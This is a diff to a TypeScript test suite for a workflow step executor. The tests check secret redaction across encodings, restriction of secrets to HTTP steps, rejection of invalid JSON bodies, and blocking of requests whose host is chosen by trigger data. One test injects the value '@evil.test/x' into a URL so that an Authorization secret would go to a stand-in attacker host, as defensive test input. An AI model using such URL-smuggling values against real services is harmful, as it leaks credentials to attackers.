@@ -12,6 +12,9 @@ import { createExecutor } from "./index";
 import { BLOCKED_RANGES, blockListOf } from "./ssrf";
 
 const SECRET = "tok_live_9f8e7d6c5b4a";
+// A secret with a quote, backslash, newline and percent sign: it is escaped differently in JSON, URLs and form bodies.
+const TRICKY = 'sk"q\\b\nn%25 x';
+const TRICKY_FORMS = [TRICKY, JSON.stringify(TRICKY).slice(1, -1), encodeURIComponent(TRICKY), new URLSearchParams({ v: TRICKY }).toString().slice(2)];
 const key = randomBytes(32);
 let db: Db;
 let pool: Pool;
@@ -28,6 +31,8 @@ beforeAll(async () => {
   const [user] = await db.insert(users).values({ email: "owner@test.local", passwordHash: "x" }).returning();
   userId = user!.id;
   await db.insert(secrets).values({ userId, name: "api_token", ...encryptSecret(key, userId, "api_token", SECRET) });
+  await db.insert(secrets).values({ userId, name: "tricky", ...encryptSecret(key, userId, "tricky", TRICKY) });
+  await db.insert(secrets).values({ userId, name: "host_part", ...encryptSecret(key, userId, "host_part", "acme-internal") });
 
   // Echoes the Authorization header back in the body and in a response header, as a careless API might.
   server = createServer((req, res) => {
@@ -36,6 +41,8 @@ beforeAll(async () => {
     req.on("data", (c: Buffer) => (body += c.toString()));
     req.on("end", () => {
       bodies.push(body);
+      // A careless API that echoes the raw request back as text.
+      if (req.url!.startsWith("/echo-raw")) return res.writeHead(200, { "content-type": "text/plain" }).end(`${req.url}\n${req.headers.authorization}\n${body}`);
       res.writeHead(200, { "content-type": "application/json", "x-echo": req.headers.authorization ?? "" });
       res.end(JSON.stringify({ youSent: req.headers.authorization, [SECRET]: "as a key too" }));
     });
@@ -76,7 +83,8 @@ const executor = () =>
     guard: {
       blockList: blockListOf(BLOCKED_RANGES.filter(([net]) => net !== "127.0.0.0")),
       ports: ["", String(port)],
-      resolve: async () => [{ address: "127.0.0.1", family: 4 }],
+      // Hosts under .nowhere do not resolve, so a lookup error carries the host name.
+      resolve: async (host: string) => (host.endsWith(".nowhere") ? [] : [{ address: "127.0.0.1", family: 4 }]),
     },
   });
 const run = (step: Step, trigger: unknown = {}) =>
@@ -107,12 +115,70 @@ describe("step executor", () => {
   });
 
   it("redacts secrets from error messages", async () => {
+    const step: Step = { id: "call", type: "http", config: { method: "GET", url: "http://{{secrets.host_part}}.nowhere/x", headers: {} } };
+    const err = (await run(step).then(() => undefined, (e: unknown) => e)) as Error & { input: unknown };
+    expect(err.message).toBe("[secret].nowhere did not resolve");
+    expect(err.input).toMatchObject({ url: "http://[secret].nowhere/x" });
+  });
+
+  it("gives secrets to HTTP steps only: an email, AI prompt or condition resolves them to nothing", async () => {
     const step: Step = { id: "mail", type: "email", config: { to: "{{secrets.api_token}}", subject: "s", text: "t" } };
-    const err = (await run(step).then(() => undefined, (e: unknown) => e)) as Error & { retryable: boolean };
-    expect(err.message).not.toContain(SECRET);
-    expect(err.message).toContain("[secret]");
-    expect(err.retryable).toBe(false);
-    expect((err as unknown as { input: unknown }).input).toEqual({ to: "[secret]", subject: "s", text: "t" });
+    const err = (await run(step).then(() => undefined, (e: unknown) => e)) as Error & { retryable: boolean; input: unknown };
+    expect(err.message).toBe("email has no recipients");
+    expect(err.input).toEqual({ to: "", subject: "s", text: "t" });
+    const cond = await run({ id: "c", type: "condition", config: { condition: { left: "{{secrets.api_token}}", op: "eq", right: SECRET } } });
+    expect(cond.branch).toBe("false");
+  });
+
+  describe("stored previews (QA regression, fec03cc)", () => {
+    // A function: port is only known once beforeAll has run. Headers cannot hold a newline, so TRICKY goes in the body.
+    const tricky = (): Step => ({
+      id: "call",
+      type: "http",
+      config: {
+        method: "POST",
+        url: `http://api.test:${port}/echo-raw?k={{secrets.api_token}}`,
+        headers: { Authorization: "Bearer {{secrets.api_token}}", "Content-Type": "application/json" },
+        body: '{"a": "{{secrets.tricky}}", "nested": {"b": "x {{secrets.tricky}} y"}, "typed": {{secrets.tricky}}}',
+      },
+    });
+    const leaks = (v: unknown) => TRICKY_FORMS.filter((f) => JSON.stringify(v).includes(f) || JSON.stringify(v).includes(JSON.stringify(f).slice(1, -1)));
+
+    it("sends the real secret but stores only [secret], in every encoding, for live and mocked runs", async () => {
+      const live = await run(tricky());
+      const sent = JSON.parse(bodies.at(-1)!) as { a: string; nested: { b: string }; typed: string };
+      expect(sent).toEqual({ a: TRICKY, nested: { b: `x ${TRICKY} y` }, typed: TRICKY });
+      expect(received.at(-1)).toBe(`Bearer ${SECRET}`);
+      expect(leaks(live.input)).toEqual([]);
+      expect(JSON.stringify(live)).not.toContain(SECRET);
+      expect(leaks(live.output)).toEqual([]);
+      expect(live.input).toMatchObject({ headers: { Authorization: "Bearer [secret]" }, body: '{"a":"[secret]","nested":{"b":"x [secret] y"},"typed":"[secret]"}' });
+
+      const mocked = await executor().execute({ runId: "r", stepRunId: NO_STEP_RUN, userId, step: tricky(), attempt: 1, idempotencyKey: "r:s:1", ctx: { trigger: {}, steps: {} }, mock: true });
+      expect(leaks(mocked.input)).toEqual([]);
+      expect(leaks(mocked.output)).toEqual([]);
+    });
+
+    it("refuses a request that sends a secret to a host chosen by trigger data", async () => {
+      const calls = received.length;
+      const step: Step = { id: "call", type: "http", config: { method: "GET", url: `http://api.test:${port}{{trigger.path}}`, headers: { Authorization: "Bearer {{secrets.api_token}}" } } };
+      const err = (await run(step, { path: "@evil.test/x" }).then(() => undefined, (e: unknown) => e)) as Error & { retryable: boolean };
+      expect(err.message).toMatch(/fixed address/);
+      expect(err.retryable).toBe(false);
+      expect(received.length).toBe(calls);
+      // The same step with data only in the path is fine.
+      await run(step, { path: "/ok" });
+      expect(received.at(-1)).toBe(`Bearer ${SECRET}`);
+    });
+
+    it("refuses a body that says it is JSON but is not, before sending anything", async () => {
+      const calls = received.length;
+      const step: Step = { id: "call", type: "http", config: { method: "POST", url: `http://api.test:${port}/x`, headers: { "content-type": "application/json" }, body: '{"a": 1' } };
+      const err = (await run(step).then(() => undefined, (e: unknown) => e)) as Error & { retryable: boolean };
+      expect(err.message).toMatch(/not valid JSON/);
+      expect(err.retryable).toBe(false);
+      expect(received.length).toBe(calls);
+    });
   });
 
   it("does not resolve a secret reference that arrives in trigger data", async () => {
